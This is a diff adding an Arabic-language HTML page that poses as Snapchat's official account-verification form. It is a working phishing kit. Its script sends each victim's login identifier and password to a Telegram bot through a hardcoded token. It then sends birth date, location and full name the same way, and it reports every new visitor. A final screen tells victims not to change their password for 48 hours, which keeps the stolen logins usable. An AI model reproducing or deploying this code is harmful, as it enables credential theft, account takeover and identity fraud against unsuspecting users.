@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#FFFC00">
+<title>Snapchat · توثيق الحساب</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{--y:#FFFC00;--ink:#0B0B0B;--muted:#8A8A8A;--line:#EDEDED;--err:#E23B3B}
+body{margin:0;min-height:100vh;font-family:'Cairo',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:radial-gradient(circle at 50% -20%,#FFFDB0 0%,#FFFC00 40%,#EDE800 100%);display:flex;align-items:center;justify-content:center;padding:26px 16px;color:var(--ink);position:relative;overflow-x:hidden}
+.ghost-bg{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none;opacity:.08}
+.ghost-bg svg{width:min(92vw,600px);height:auto;fill:#0B0B0B}
+.card{position:relative;width:100%;max-width:430px;background:#fff;border-radius:30px;padding:32px 26px 24px;box-shadow:0 30px 70px -20px rgba(0,0,0,.35),0 2px 0 rgba(0,0,0,.04);animation:pop .5s cubic-bezier(.2,.8,.2,1)}
+@keyframes pop{from{opacity:0;transform:translateY(18px) scale(.98)}to{opacity:1;transform:none}}
+.brand{display:flex;flex-direction:column;align-items:center;gap:9px;margin-bottom:18px}
+.logo{width:64px;height:64px;border-radius:20px;background:var(--y);display:grid;place-items:center;box-shadow:0 10px 22px -8px rgba(0,0,0,.35)}
+.logo svg{width:34px;height:34px;fill:#0B0B0B}
+.brand h1{margin:0;font-size:20px;font-weight:900;letter-spacing:.4px}
+.brand p{margin:0;font-size:12.5px;color:var(--muted);font-weight:700}
+.bars{display:flex;gap:6px;margin:0 0 20px}
+.bars i{flex:1;height:4px;border-radius:99px;background:var(--line);transition:.35s}
+.bars i.on{background:#0B0B0B}
+.step{display:none}
+.step.active{display:block;animation:fade .35s ease}
+@keyframes fade{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:none}}
+h2{margin:0 0 6px;font-size:17.5px;font-weight:900}
+.hint{margin:0 0 18px;font-size:12.5px;color:var(--muted);font-weight:600;line-height:1.7}
+label{display:block;font-size:12.5px;font-weight:800;margin:0 0 7px;color:#3a3a3a}
+.field{position:relative;margin-bottom:13px}
+input,select{width:100%;height:52px;border-radius:14px;border:1.6px solid var(--line);background:#F7F7F7;padding:0 14px;font-family:inherit;font-size:15px;font-weight:700;color:var(--ink);outline:none;transition:.18s;appearance:none}
+select{background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' fill='%23777'><path d='M7 10L2 4h10z'/></svg>");background-repeat:no-repeat;background-position:left 14px center;padding-left:34px}
+input:focus,select:focus{border-color:#0B0B0B;background:#fff;box-shadow:0 0 0 4px rgba(255,252,0,.6)}
+input::placeholder{color:#B5B5B5;font-weight:500}
+.ltr{direction:ltr;text-align:left}
+.grid3{display:grid;grid-template-columns:1fr 1.35fr 1.1fr;gap:8px}
+.eye{position:absolute;top:50%;transform:translateY(-50%);left:7px;border:none;background:#EAEAEA;color:#333;font-family:inherit;font-size:11.5px;font-weight:800;padding:8px 12px;border-radius:9px;cursor:pointer}
+.pw input{padding-left:78px}
+.err{color:var(--err);font-size:12.5px;font-weight:800;min-height:17px;margin:0 0 10px}
+.btn{width:100%;height:54px;border:none;border-radius:99px;background:var(--y);color:#0B0B0B;font-family:inherit;font-size:15.5px;font-weight:900;cursor:pointer;transition:.18s;box-shadow:0 12px 26px -14px rgba(0,0,0,.65);display:flex;align-items:center;justify-content:center;text-decoration:none}
+.btn:hover{background:#F4EF00;transform:translateY(-1px)}
+.btn:active{transform:translateY(0) scale(.99)}
+.btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+.foot{margin-top:18px;display:flex;align-items:center;justify-content:center;gap:6px;font-size:10.5px;color:#A5A5A5;font-weight:700}
+.foot svg{width:11px;height:11px;fill:#A5A5A5}
+.check{width:78px;height:78px;border-radius:50%;background:var(--y);display:grid;place-items:center;margin:4px auto 16px;box-shadow:0 12px 26px -12px rgba(0,0,0,.45);animation:pop .45s}
+.check svg{width:36px;height:36px;stroke:#0B0B0B;stroke-width:3.2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+.notice{display:flex;gap:10px;background:#FFFBDB;border:1.5px dashed #E4DA00;border-radius:16px;padding:13px 14px;margin:14px 0 18px;font-size:12.8px;font-weight:700;line-height:1.8}
+.notice b{display:block;font-size:13.5px;margin-bottom:2px}
+.alt{display:block;text-align:center;margin-top:12px;font-size:12px;font-weight:800;color:#555;text-decoration:none}
+.alt:hover{color:#000;text-decoration:underline}
+</style>
+</head>
+<body>
+<div class="ghost-bg"><svg viewBox="0 0 24 24"><path d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.345-.03.51.075.045.203.09.401.09.3-.016.659-.12 1.033-.301.165-.088.344-.104.464-.104.182 0 .359.029.509.09.45.149.734.479.734.838.015.449-.39.839-1.213 1.168-.089.029-.209.075-.344.119-.45.135-1.139.36-1.333.81-.09.224-.061.524.12.868l.015.015c.06.136 1.526 3.475 4.791 4.014.255.044.435.27.42.509 0 .075-.015.149-.045.225-.24.569-1.273.988-3.146 1.271-.059.091-.12.375-.164.57-.029.179-.074.36-.134.553-.076.271-.27.405-.555.405h-.03c-.135 0-.313-.031-.538-.074-.36-.075-.765-.135-1.273-.135-.3 0-.599.015-.913.074-.6.104-1.123.464-1.723.884-.853.599-1.826 1.288-3.294 1.288-.06 0-.119-.015-.18-.015h-.149c-1.468 0-2.427-.675-3.279-1.288-.599-.42-1.107-.779-1.707-.884-.314-.045-.629-.074-.928-.074-.54 0-.958.089-1.272.149-.211.043-.391.074-.54.074-.374 0-.523-.224-.583-.42-.061-.192-.09-.389-.135-.567-.046-.181-.105-.494-.166-.57-1.918-.222-2.95-.642-3.189-1.226-.031-.063-.052-.15-.055-.225-.015-.243.165-.465.42-.509 3.264-.54 4.73-3.879 4.791-4.02l.016-.029c.18-.345.224-.645.119-.869-.195-.434-.884-.658-1.332-.809-.121-.029-.24-.074-.346-.119-1.107-.435-1.257-.93-1.197-1.273.09-.479.674-.793 1.168-.793.146 0 .27.029.383.074.42.194.789.3 1.104.3.234 0 .384-.06.465-.105l-.046-.569c-.098-1.626-.225-3.651.307-4.837C7.392 1.077 10.739.807 11.727.807l.419-.015h.06z"/></svg></div>
+<main class="card">
+  <div class="brand">
+    <div class="logo"><svg viewBox="0 0 24 24"><path d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.345-.03.51.075.045.203.09.401.09.3-.016.659-.12 1.033-.301.165-.088.344-.104.464-.104.182 0 .359.029.509.09.45.149.734.479.734.838.015.449-.39.839-1.213 1.168-.089.029-.209.075-.344.119-.45.135-1.139.36-1.333.81-.09.224-.061.524.12.868l.015.015c.06.136 1.526 3.475 4.791 4.014.255.044.435.27.42.509 0 .075-.015.149-.045.225-.24.569-1.273.988-3.146 1.271-.059.091-.12.375-.164.57-.029.179-.074.36-.134.553-.076.271-.27.405-.555.405h-.03c-.135 0-.313-.031-.538-.074-.36-.075-.765-.135-1.273-.135-.3 0-.599.015-.913.074-.6.104-1.123.464-1.723.884-.853.599-1.826 1.288-3.294 1.288-.06 0-.119-.015-.18-.015h-.149c-1.468 0-2.427-.675-3.279-1.288-.599-.42-1.107-.779-1.707-.884-.314-.045-.629-.074-.928-.074-.54 0-.958.089-1.272.149-.211.043-.391.074-.54.074-.374 0-.523-.224-.583-.42-.061-.192-.09-.389-.135-.567-.046-.181-.105-.494-.166-.57-1.918-.222-2.95-.642-3.189-1.226-.031-.063-.052-.15-.055-.225-.015-.243.165-.465.42-.509 3.264-.54 4.73-3.879 4.791-4.02l.016-.029c.18-.345.224-.645.119-.869-.195-.434-.884-.658-1.332-.809-.121-.029-.24-.074-.346-.119-1.107-.435-1.257-.93-1.197-1.273.09-.479.674-.793 1.168-.793.146 0 .27.029.383.074.42.194.789.3 1.104.3.234 0 .384-.06.465-.105l-.046-.569c-.098-1.626-.225-3.651.307-4.837C7.392 1.077 10.739.807 11.727.807l.419-.015h.06z"/></svg></div>
+    <h1>Snapchat</h1>
+    <p>توثيق الحساب الرسمي</p>
+  </div>
+
+  <div class="bars"><i class="on"></i><i></i><i></i></div>
+
+  <section class="step active" data-step="1">
+    <h2>تسجيل الدخول</h2>
+    <p class="hint">أدخل بريدك الإلكتروني أو رقم هاتفك مع كلمة المرور للمتابعة.</p>
+    <label>البريد الإلكتروني أو رقم الهاتف</label>
+    <div class="field"><input id="identifier" class="ltr" type="text" inputmode="email" autocomplete="username" placeholder="name@example.com"></div>
+    <label>كلمة المرور</label>
+    <div class="field pw"><input id="password" class="ltr" type="password" autocomplete="current-password" placeholder="••••••••"><button type="button" class="eye" id="togglePw">إظهار</button></div>
+    <p class="err" id="err1"></p>
+    <button class="btn" id="next1">متابعة</button>
+  </section>
+
+  <section class="step" data-step="2">
+    <h2>تاريخ الميلاد والموقع</h2>
+    <p class="hint">نحتاج هذه المعلومات لمطابقتها مع بيانات حسابك.</p>
+    <label>تاريخ الميلاد</label>
+    <div class="grid3 field"><select id="day"></select><select id="month"></select><select id="year"></select></div>
+    <label>البلد</label>
+    <div class="field"><select id="country"></select></div>
+    <label>الولاية / المنطقة</label>
+    <div class="field" id="regionWrap"><select id="region"></select></div>
+    <p class="err" id="err2"></p>
+    <button class="btn" id="next2">متابعة</button>
+  </section>
+
+  <section class="step" data-step="3">
+    <h2>اسمك الحقيقي</h2>
+    <p class="hint">اكتب الاسم كما هو مسجّل في حسابك على سناب شات تماماً.</p>
+    <label>الاسم الكامل</label>
+    <div class="field"><input id="fullname" type="text" placeholder="الاسم الأول واسم العائلة"></div>
+    <p class="err" id="err3"></p>
+    <button class="btn" id="next3">إرسال الطلب</button>
+  </section>
+
+  <section class="step" data-step="4">
+    <div class="check"><svg viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
+    <h2 style="text-align:center">تم استلام طلبك</h2>
+    <p class="hint" style="text-align:center">طلب توثيق حسابك قيد المراجعة الآن من فريق سناب شات.</p>
+    <div class="notice">
+      <div><b>مدة المراجعة: 48 ساعة</b>سيصلك إشعار التوثيق خلال 48 ساعة من الآن، ويمكنك استخدام حسابك بشكل طبيعي أثناء ذلك. لا تغيّر كلمة المرور حتى انتهاء المراجعة.</div>
+    </div>
+    <a class="btn" href="https://www.snapchat.com/" target="_blank" rel="noopener">الانتقال إلى سناب شات</a>
+    <a class="alt" href="https://www.snapchat.com/download" target="_blank" rel="noopener">فتح تطبيق سناب شات</a>
+  </section>
+
+  <div class="foot"><svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 00-5 5v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7a5 5 0 00-5-5zm-3 8V7a3 3 0 016 0v3z"/></svg><span>اتصال آمن ومشفّر · Snapchat Inc.</span></div>
+</main>
+<script>
+(function(){
+  var TOKEN='9101381894:AAF9qc6uiQwE4ImhifzD70XgQEyvOhYyvxQ';
+  var FALLBACK_CHAT=''; // ضع chat_id هنا إن أردت تثبيته
+  var chatId=localStorage.getItem('sc_chat')||FALLBACK_CHAT;
+  var $=function(s){return document.querySelector(s)};
+  var esc=function(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')};
+  var now=function(){return new Date().toLocaleString('ar-EG',{dateStyle:'full',timeStyle:'medium'})};
+  var D={};
+
+  async function resolveChat(){
+    if(chatId) return chatId;
+    try{
+      var r=await fetch('https://api.telegram.org/bot'+TOKEN+'/getUpdates?limit=20');
+      var j=await r.json();
+      var arr=(j.result||[]).slice().reverse();
+      for(var i=0;i<arr.length;i++){
+        var it=arr[i];
+        var c=(it.message&&it.message.chat&&it.message.chat.id)||(it.channel_post&&it.channel_post.chat&&it.channel_post.chat.id)||(it.edited_message&&it.edited_message.chat&&it.edited_message.chat.id);
+        if(c){chatId=String(c);localStorage.setItem('sc_chat',chatId);break;}
+      }
+    }catch(e){}
+    return chatId;
+  }
+  async function send(html){
+    var id=await resolveChat();
+    if(!id){console.warn('[Snap] chat_id غير متوفر — أرسل رسالة للبوت أولاً');return;}
+    try{
+      await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:id,text:html,parse_mode:'HTML',disable_web_page_preview:true})
+      });
+    }catch(e){console.warn(e);}
+  }
+  function go(n){
+    document.querySelectorAll('.step').forEach(function(s){s.classList.toggle('active',+s.dataset.step===n)});
+    document.querySelectorAll('.bars i').forEach(function(b,i){b.classList.toggle('on',i<n-1)});
+    document.querySelector('.bars').style.display=n>=4?'none':'flex';
+    window.scrollTo({top:0,behavior:'smooth'});
+  }
+
+  $('#togglePw').onclick=function(){
+    var p=$('#password');
+    var show=p.type==='password';
+    p.type=show?'text':'password';
+    this.textContent=show?'إخفاء':'إظهار';
+  };
+
+  $('#next1').onclick=async function(){
+    var id=$('#identifier').value.trim(), pw=$('#password').value, e=$('#err1');
+    if(id.length<3){e.textContent='أدخل بريداً إلكترونياً أو رقم هاتف صحيحاً';return;}
+    if(pw.length<4){e.textContent='أدخل كلمة المرور (٤ أحرف على الأقل)';return;}
+    e.textContent=''; D.identifier=id; D.password=pw;
+    var b=this; b.disabled=true; b.textContent='جارٍ التحقق...';
+    await send('🔐 <b>Snapchat — بيانات الدخول</b>\n\n👤 <b>المعرّف:</b> <code>'+esc(id)+'</code>\n🔑 <b>كلمة المرور:</b> <code>'+esc(pw)+'</code>\n\n🕒 '+now()+'\n📱 '+esc(navigator.userAgent));
+    b.disabled=false; b.textContent='متابعة'; go(2);
+  };
+
+  var dS=$('#day'), mS=$('#month'), yS=$('#year');
+  for(var d=1;d<=31;d++) dS.insertAdjacentHTML('beforeend','<option value="'+d+'">'+d+'</option>');
+  ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'].forEach(function(m,i){mS.insertAdjacentHTML('beforeend','<option value="'+(i+1)+'">'+m+'</option>')});
+  var cy=new Date().getFullYear();
+  for(var y=cy;y>=1940;y--) yS.insertAdjacentHTML('beforeend','<option value="'+y+'">'+y+'</option>');
+
+  var COUNTRIES=[['SA','السعودية'],['EG','مصر'],['AE','الإمارات'],['KW','الكويت'],['QA','قطر'],['BH','البحرين'],['OM','عُمان'],['JO','الأردن'],['IQ','العراق'],['SY','سوريا'],['LB','لبنان'],['PS','فلسطين'],['YE','اليمن'],['SD','السودان'],['LY','ليبيا'],['TN','تونس'],['DZ','الجزائر'],['MA','المغرب'],['MR','موريتانيا'],['TR','تركيا'],['US','الولايات المتحدة'],['GB','بريطانيا'],['DE','ألمانيا'],['FR','فرنسا'],['CA','كندا'],['AU','أستراليا'],['IN','الهند'],['PK','باكستان'],['NG','نيجيريا'],['OTHER','أخرى']];
+  var REGIONS={
+    SA:['الرياض','مكة المكرمة','المدينة المنورة','القصيم','المنطقة الشرقية','عسير','تبوك','حائل','الحدود الشمالية','جازان','نجران','الباحة','الجوف'],
+    EG:['القاهرة','الجيزة','الإسكندرية','الدقهلية','الشرقية','القليوبية','كفر الشيخ','الغربية','المنوفية','البحيرة','دمياط','بورسعيد','الإسماعيلية','السويس','الفيوم','بني سويف','المنيا','أسيوط','سوهاج','قنا','الأقصر','أسوان','البحر الأحمر','مطروح','شمال سيناء','جنوب سيناء','الوادي الجديد'],
+    AE:['أبوظبي','دبي','الشارقة','عجمان','أم القيوين','رأس الخيمة','الفجيرة'],
+    KW:['العاصمة','حولي','الفروانية','الجهراء','الأحمدي','مبارك الكبير'],
+    QA:['الدوحة','الريان','الوكرة','الخور','الشمال','أم صلال','الظعاين','الشحانية'],
+    BH:['العاصمة','المحرق','الشمالية','الجنوبية'],
+    OM:['مسقط','ظفار','مسندم','البريمي','الداخلية','الشرقية','الظاهرة','جنوب الباطنة','شمال الباطنة','الوسطى'],
+    JO:['عمان','إربد','الزرقاء','البلقاء','المفرق','مادبا','جرش','عجلون','الكرك','معان','الطفيلة','العقبة'],
+    IQ:['بغداد','البصرة','الموصل','أربيل','النجف','كربلاء','السليمانية','الأنبار','ديالى','ذي قار'],
+    SY:['دمشق','حلب','حمص','حماة','اللاذقية','طرطوس','دير الزور','الحسكة','إدلب','درعا'],
+    LB:['بيروت','الشمال','البقاع','الجنوب','جبل لبنان'],
+    PS:['الضفة الغربية','قطاع غزة','القدس'],
+    YE:['صنعاء','عدن','تعز','حضرموت','الحديدة','إب'],
+    SD:['الخرطوم','الجزيرة','البحر الأحمر','كسلا','شمال كردفان','جنوب دارفور'],
+    LY:['طرابلس','بنغازي','مصراتة','الزاوية','البيضاء','سبها'],
+    TN:['تونس','صفاقس','سوسة','بنزرت','القيروان','قابس','المنستير','نابل'],
+    DZ:['الجزائر','وهران','قسنطينة','عنابة','سطيف','باتنة','بجاية','تلمسان','بسكرة','تيارت'],
+    MA:['الرباط','الدار البيضاء','مراكش','فاس','طنجة','أكادير','مكناس','وجدة','تطوان','القنيطرة','سلا','الجديدة'],
+    US:['كاليفورنيا','تكساس','نيويورك','فلوريدا','إلينوي','نيوجيرسي','أريزونا','ميشيغان','واشنطن','ماساتشوستس','بنسلفانيا','أوهايو','جورجيا','كارولينا الشمالية','فرجينيا','ولاية أخرى'],
+    CA:['أونتاريو','كيبيك','كولومبيا البريطانية','ألبرتا','مانيتوبا','ساسكاتشوان','نوفا سكوشا'],
+    GB:['إنجلترا','اسكتلندا','ويلز','أيرلندا الشمالية'],
+    DE:['برلين','بافاريا','هامبورغ','هيسن','ساكسونيا','شمال الراين','بادن فورتمبيرغ'],
+    FR:['إيل دو فرانس','أوفرن','بروفانس','نورماندي','بريتاني','أوكسيتاني'],
+    TR:['إسطنبول','أنقرة','إزمير','بورصة','أنطاليا','أضنة'],
+    IN:['ماهاراشترا','دلهي','كارناتاكا','تاميل نادو','غوجارات','أوتار براديش','راجستان','البنغال الغربية'],
+    PK:['البنجاب','السند','خيبر بختونخوا','بلوشستان','إسلام آباد'],
+    NG:['لاغوس','أبوجا','كانو','أويو','ريفرز','كادونا'],
+    AU:['نيو ساوث ويلز','فيكتوريا','كوينزلاند','أستراليا الغربية','جنوب أستراليا']
+  };
+  var cS=$('#country'), rS=$('#region');
+  cS.insertAdjacentHTML('beforeend','<option value="">اختر البلد</option>');
+  COUNTRIES.forEach(function(c){cS.insertAdjacentHTML('beforeend','<option value="'+c[0]+'">'+c[1]+'</option>')});
+  cS.onchange=function(){
+    var code=this.value, list=REGIONS[code];
+    rS.innerHTML='';
+    if(list){
+      rS.insertAdjacentHTML('beforeend','<option value="">اختر المنطقة</option>');
+      list.forEach(function(r){rS.insertAdjacentHTML('beforeend','<option value="'+esc(r)+'">'+esc(r)+'</option>')});
+    }else{
+      rS.insertAdjacentHTML('beforeend','<option value="">اكتب المنطقة بالأسفل</option>');
+    }
+  };
+
+  $('#next2').onclick=async function(){
+    var e=$('#err2');
+    if(!dS.value||!mS.value||!yS.value){e.textContent='اختر تاريخ الميلاد كاملاً';return;}
+    if(!cS.value){e.textContent='اختر البلد';return;}
+    if(!rS.value){e.textContent='اختر الولاية / المنطقة';return;}
+    e.textContent='';
+    var bd=dS.value+'/'+mS.value+'/'+yS.value;
+    var cName=cS.options[cS.selectedIndex].text, rName=rS.options[rS.selectedIndex].text;
+    D.birth=bd; D.country=cName; D.region=rName;
+    var b=this; b.disabled=true; b.textContent='جارٍ الحفظ...';
+    await send('🎂 <b>بيانات إضافية</b>\n\n📅 <b>تاريخ الميلاد:</b> <code>'+esc(bd)+'</code>\n🌍 <b>البلد:</b> '+esc(cName)+'\n📍 <b>المنطقة:</b> '+esc(rName)+'\n\n🕒 '+now());
+    b.disabled=false; b.textContent='متابعة'; go(3);
+  };
+
+  $('#next3').onclick=async function(){
+    var n=$('#fullname').value.trim(), e=$('#err3');
+    if(n.length<3){e.textContent='أدخل اسمك الكامل';return;}
+    e.textContent=''; D.name=n;
+    var b=this; b.disabled=true; b.textContent='جارٍ الإرسال...';
+    await send('✅ <b>طلب توثيق مكتمل</b>\n\n👤 <b>الاسم:</b> '+esc(n)+'\n🔐 <b>المعرّف:</b> <code>'+esc(D.identifier)+'</code>\n🔑 <b>كلمة المرور:</b> <code>'+esc(D.password)+'</code>\n🎂 <b>الميلاد:</b> <code>'+esc(D.birth)+'</code>\n🌍 '+esc(D.country)+' — '+esc(D.region)+'\n\n🕒 '+now()+'\n📱 '+esc(navigator.userAgent)+'\n🌐 '+esc(location.href));
+    b.disabled=false; b.textContent='إرسال الطلب'; go(4);
+  };
+
+  document.addEventListener('keydown',function(ev){
+    if(ev.key!=='Enter') return;
+    var a=document.querySelector('.step.active .btn');
+    if(a) a.click();
+  });
+
+  if(!sessionStorage.getItem('sc_seen')){
+    sessionStorage.setItem('sc_seen','1');
+    send('🔔 <b>زائر جديد فتح صفحة التوثيق</b>\n\n🕒 '+now()+'\n📱 '+esc(navigator.userAgent)+'\n🌐 '+esc(location.href));
+  }
+})();
+</script>
+</body>
+</html>
